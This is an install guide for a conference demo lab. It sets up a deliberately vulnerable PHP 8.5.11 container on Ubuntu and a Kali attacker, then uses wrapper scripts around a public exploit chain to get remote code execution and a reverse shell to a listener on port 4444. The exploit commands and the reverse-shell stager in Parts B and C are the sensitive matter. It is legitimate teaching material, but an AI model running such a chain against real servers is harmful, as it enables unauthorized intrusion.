# Install from scratch — Ubuntu Server 24.04.4 + Kali

This guide assumes the worst case: **freshly installed Ubuntu Server 24.04.4**,
without Docker, without git, with nothing but SSH — and a **Kali rolling** box on
the other side. Every command is in the order it must be run, with the expected
output.

Index:

* [Part 0 — what the network must have](#part-0--what-the-network-must-have)
* [Part A — Ubuntu (target), from scratch](#part-a--ubuntu-target-from-scratch)
* [Part B — Kali (attacker), from scratch](#part-b--kali-attacker-from-scratch)
* [Part C — run of show](#part-c--run-of-show)

---

## Part 0 — what the network must have

| Machine | Example IP | Role |
|---------|------------|------|
| Ubuntu Server 24.04.4 | `192.0.2.20` | target (Apache + PHP 8.5.11 in the container) |
| Kali Linux | `192.0.2.10` | attacker (toolkit, listener, reverse shell) |

* Both on the **same network** (bridge). NAT between them breaks the shell's
  return path.
* Ports: `8080/tcp` on Ubuntu (target) and `4444/tcp` on Kali (listener).
* Find each IP with `ip -4 -br a` (ignore `lo`).

> If Kali is your laptop and Ubuntu is a VM **on the same machine**, put the VM in
> **bridge** mode (not NAT) — otherwise `www-data` cannot open a connection back
> to Kali.

---

## Part A — Ubuntu (target), from scratch

### A.1 Check what you have

```bash
lsb_release -a          # Description: Ubuntu 24.04.4 LTS
uname -m                # x86_64  (or aarch64)
ip -4 -br a             # note the IP: e.g. 192.0.2.20
```

If `lsb_release` does not exist, use `cat /etc/os-release`.

### A.2 Get the package onto the VM

The lab lives inside this repository. Clone it on the VM:

```bash
sudo apt update && sudo apt install -y git
git clone https://github.com/nullbyter19/php2shell.git ~/php2shell
cd ~/php2shell/ubuntu-lab
```

If the VM has no internet access, copy the folder over SSH from your workstation
(PowerShell, in the repository directory):

```powershell
scp -r .\ubuntu-lab r19@192.0.2.20:~/
```

Alternatives:

* **USB stick**: copy the `ubuntu-lab/` folder and use it the same way.

If the files came from a zip/USB stick and the scripts lost the execute bit:

```bash
chmod +x install.sh uninstall.sh verify.sh kali/*.sh
```

### A.3 Docker (this is what `install.sh` does on its own)

On a blank machine, the installer runs the steps below. Do it by hand if you
want to, or to understand what it is doing:

```bash
sudo apt update
sudo apt install -y ca-certificates curl docker.io docker-compose-v2
sudo systemctl enable --now docker
```

Check the three requirements:

```bash
docker --version          # Docker version 24.x or 26.x
docker compose version    # Docker Compose version v2.x
sudo docker run --rm hello-world   # "Hello from Docker!"
```

Notes:

- `docker.io` and `docker-compose-v2` are the **Ubuntu** packages (the
  `universe` repository) — no third-party repository needed.
  `docker-compose-v2` exists on Ubuntu 24.04 (`noble`) as version **2.24.6**
  (`2.24.6+ds1-0ubuntu2`), and installs the `docker compose` (v2) binary.
- The `php:8.5.11-apache` image exists on Docker Hub, with `linux/amd64` and
  `linux/arm64` (checked on 2026-11; the tag is from 2025 and was republished on
  2026-10-21). `php:8.5.12-apache`, used in the fix demo, exists too.
* `install.sh` runs as **root**, so you do not need to join the `docker` group.
  You would only join it if you wanted to use `docker` without `sudo`:
  `sudo usermod -aG docker $USER` + log back in.
* If you have another Docker installation (Docker Desktop, snap), it works the
  same — what matters is that `docker compose` responds.

### A.4 Install the lab

```bash
cd ~/ubuntu-lab
sudo ./install.sh --lhost 192.0.2.10
```

`--lhost` is the **Kali IP** (whoever will receive the reverse shell). Find it on
Kali with `ip -4 -br a`. Options:

| Flag | Default | What for |
|------|---------|----------|
| `--lhost <ip>` | required | Kali IP, written inside the stager |
| `--lport <port>` | `4444` | listener port on Kali |
| `--port <port>` | `8080` | published port on Ubuntu |

What it does, in order: validates root/Ubuntu/architecture → installs `curl`,
`docker.io` and `docker-compose-v2` if missing → starts the daemon → pulls
`php:8.5.11-apache` (~500 MB, first time only) → creates `storage/`,
`app/stage/` and writes the stager with the Kali IP → brings the container up →
opens the port in `ufw` if it is active → runs `verify.sh`.

Expected time: **3 to 8 minutes**, almost all of it downloading the image.

Running it again with a different `--lhost` only rewrites the stager (it is
idempotent).

### A.5 Verify (do not skip)

```bash
sudo ./verify.sh
```

Expected output:

```
  ok    victim container is running
  ok    home page answering (Photo Drop)
  ok    ping.php: php=8.5.11 sapi=apache2handler arch=amd64 pid=41
  ok    vulnerable version (8.5.11)
  ok    two requests served by the SAME process (pid=41)
  ok    docroot writable by www-data (needed for the id>p1 proof)
  ok    storage writable by www-data (application uploads)
  ok    apache-lab.conf mounted (ServerLimit 1, MaxRequestWorkers 1)
  ok    session.upload_progress.prefix is the default (upload_progress_)
  ok    session.upload_progress.name is the default (PHP_SESSION_UPLOAD_PROGRESS)
  ok    upload_progress enabled and session.use_strict_mode=0
  ok    memory_limit=8M, display_errors=On, post_max_size=512M
  ok    stager: app/stage/s -> 192.0.2.10:4444

  All good. Target ready for the demo.
```

Test what Kali will see:

```bash
curl -s http://192.0.2.20:8080/ping.php     # version=8.5.11, one pid=
curl -s http://192.0.2.20:8080/ping.php     # the SAME pid
```

If something fails: `docs/TROUBLESHOOTING.md`, matching entry.

### A.6 If the VM has no internet on the day (offline image)

Carry the ready-made image on an `scp`/USB stick. On the machine **with**
internet:

```bash
docker pull php:8.5.11-apache
docker save php:8.5.11-apache -o php-8511.tar     # ~500 MB
```

On Ubuntu:

```bash
docker load -i php-8511.tar
docker image inspect php:8.5.11-apache >/dev/null && echo "image ok"
```

`install.sh` only pulls if the image does **not** exist locally, so it works
offline after `docker load`. Docker itself must be installed (the `docker.io`/
`docker-compose-v2` packages come from `apt`, which also needs a network) —
install them before leaving for the event.

### A.7 Firewall

`install.sh` opens the port if `ufw` is active. To check it or do it by hand:

```bash
sudo ufw status
sudo ufw allow 8080/tcp
```

### A.8 What is left running

```bash
sudo docker ps                                   # container p2s-ubuntu-victim
sudo ss -ltnp | grep 8080                        # published port
ls -la ~/ubuntu-lab/app/stage/s                  # the stager (10-byte payload)
```

To tear it down at the end: `sudo ./uninstall.sh --purge` (see the teardown
section).

---

## Part B — Kali (attacker), from scratch

### B.1 Requirements

```bash
python3 --version      # 3.11 or newer
git --version
ncat --version         # ships with nmap
rlwrap --version       # if missing, setup-kali.sh installs it
```

Whatever is missing: `sudo apt install -y git python3 ncat rlwrap`.

### B.2 Get the package onto Kali

`kali/` lives inside the same `ubuntu-lab/`. Clone the repository on Kali:

```bash
git clone https://github.com/nullbyter19/php2shell.git ~/php2shell
cd ~/php2shell/ubuntu-lab
chmod +x kali/*.sh
```

Or copy the folder back from the Ubuntu VM:

```bash
scp -r r19@192.0.2.20:~/ubuntu-lab ~/
cd ~/ubuntu-lab && chmod +x kali/*.sh
```

### B.3 Prepare the toolkit (once, needs internet)

```bash
sudo ./kali/setup-kali.sh
```

It installs `ncat`/`rlwrap` if missing, clones the public toolkit into
`~/tools/php2shell`, downloads the pinned upstream
(`9bie/php2shell-bypass-aslr-exp`, commit `4586f5c`) and lists the profiles with
verified RCE. At the end it prints your IP and the demo sequence.

Without internet on the day, use a local copy of the toolkit:

```bash
./kali/setup-kali.sh --from /mnt/usb/php2shell
```

### B.4 Test the route before any exploit

```bash
curl -s http://192.0.2.20:8080/ping.php          # version=8.5.11, arch=amd64
curl -s http://192.0.2.20:8080/ping.php          # same pid  ← critical
```

If the `pid` changes between the two calls, stop and fix it
(`TROUBLESHOOTING.md`, item 3).

### B.5 Pane 1 — the listener (open it first)

```bash
cd ~/ubuntu-lab
./kali/p2s-listen.sh --lport 4444
```

Expected: `[*] listening on 0.0.0.0:4444`.

### B.6 Pane 2 — the proof of execution

```bash
./kali/p2s-run.sh --target http://192.0.2.20:8080 --step proof
```

The script runs the pre-flight check (version, architecture, same `pid`), runs
the chain with the `id>p1` command (5 bytes) and fetches the file over HTTP.
Expected, in ~10–15 s:

```
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That is already RCE. If `--step proof` fails, **do not go on** to the shell.

### B.7 Pane 2 — the reverse shell

With the listener from B.5 open:

```bash
./kali/p2s-run.sh --target http://192.0.2.20:8080 --step shell
```

The remote command is `sh stage/s` (10 bytes; the carrier limit is 14). In
~10–15 s pane 2 prints the verdict and pane 1 shows the prompt:

```
╭─ RESULT: SHELL OK ────────────────────────────────────────
│ the stager ran and the listener accepted the TCP connection
╰──────────────────────────────────────────────
```

Inside the shell: `id`, `hostname`, `php -v | head -1`, `ls /var/www/html`.

To run both steps with a pause in between:

```bash
./kali/p2s-run.sh --target http://192.0.2.20:8080
```

To rehearse without firing: add `--dry-run`.

### B.8 Between attempts

The chain dirties the heap and may kill the Apache child. Before repeating:

```bash
ssh r19@192.0.2.20 'cd ~/ubuntu-lab/docker && sudo docker compose restart'
```

Rule of thumb: **one attempt per restart**.

### B.9 If the shell does not open

See `docs/TROUBLESHOOTING.md`, items 7 to 9. The first place to look is the
stager log:

```bash
ssh r19@192.0.2.20 'sudo docker exec p2s-ubuntu-victim cat /tmp/p2s-stager.log'
```

---

## Part C — run of show

### T-60 min — Ubuntu

```bash
cd ~/ubuntu-lab
sudo ./install.sh --lhost <KALI-IP> --lport 4444
sudo ./verify.sh
```

### T-40 min — Kali

```bash
cd ~/ubuntu-lab
sudo ./kali/setup-kali.sh
curl -s http://<UBUNTU>:8080/ping.php     # 2x, same pid
```

### T-20 min — full rehearsal

```bash
./kali/p2s-listen.sh --lport 4444          # pane 1
./kali/p2s-run.sh --target http://<UBUNTU>:8080 --step proof   # pane 2
ssh <user>@<UBUNTU> 'cd ~/ubuntu-lab/docker && sudo docker compose restart'
./kali/p2s-run.sh --target http://<UBUNTU>:8080 --step shell
```

After the rehearsal, **restart the container** so you go on stage clean.

### T-0 — on stage

Listener open before the trigger. `--step proof`, then `--step shell`.
If it fails: restart + repeat; if it keeps failing, go on with the proof only
(`uid=33(www-data)` is already RCE) and use the plan B from `docs/TALK-DEMO.md`.

### After the talk

```bash
cd ~/ubuntu-lab && sudo ./uninstall.sh --purge
```

Before plugging the VM into another network — `app/stage/s` is a working reverse
shell waiting for an IP.
